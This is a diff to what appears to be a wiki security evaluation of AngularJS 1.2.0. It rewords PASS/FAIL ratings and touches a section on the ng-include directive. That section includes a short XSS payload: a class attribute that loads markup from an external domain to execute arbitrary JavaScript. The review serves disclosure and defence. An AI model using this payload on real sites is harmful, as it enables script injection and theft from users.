@@ -29,9 +29,9 @@ From http://en.wikipedia.org/wiki/AngularJS
 
 == AngularJS 1.2.0 ==
 
- * *{}SEC-A* <font color="orange" title="Some template directives still allow for arbitrary JavaScript execution">*FAIL*</font> 
+ * *{}SEC-A* <font color="orange">*FAIL*</font> Some template directives still allow for arbitrary JavaScript execution 
  * *{}SEC-B* <font color="green">*PASS*</font> Isolated execution scope exists, makes a robust impression.
- * *{}SEC-C* <font color="orange">*FAIL*</font> Any element with the ng-app attribute can execute expressions. Injections might cause damage. 
+ * *{}SEC-C* <font color="orange">*FAIL*</font> Any element with the ng-app attribute can execute expressions. Injections might cause damage. Examples can be seen below.
  * *{}SEC-D* <font color="red">*FAIL*</font> No enforced separation, possible though and documented. Close fail on a tough requirement.
  * *{}SEC-E* <font color="green">*PASS*</font> A security@angularjs.org address is in place
  * *{}SEC-F* <font color="green">*PASS*</font> A special CSP-mode can be activated. The CSP-bypass was mitigated by fixing the expression parser. 
@@ -417,7 +417,9 @@ And here's what we still can do - bypassing the overall not-so-well-composed bla
 
 == HTML Imports ==
 
-AngularJS supports a directive that emulates the dreaded HTML imports. That means, we can request a piece of markup from the same domain (or across domain if the attacker has CORS enabled) and have the framework merge the resulting data into our DOM. This enables another very interesting way to execute arbitrary JavaScript using `class` attributes - even with latest AngularJS.
+AngularJS supports a directive that emulates the dreaded HTML imports. That means, we can request a piece of markup from the same domain (or across domain if the attacker has CORS enabled) and have the framework merge the resulting data into our DOM. 
+
+This enables another very interesting way to execute arbitrary JavaScript using `class` attributes - even with latest AngularJS.
 
 {{{
 <html ng-app>
@@ -429,3 +431,5 @@ AngularJS supports a directive that emulates the dreaded HTML imports. That mean
 	<span class="ng-include:'//ø.pw'"></span>
 </body>
 }}}
+
+In no way should a `class` attribute ever be able to execute arbitrary JavaScript. This issue currently seems to be the most risky part of AngularJS' directives.
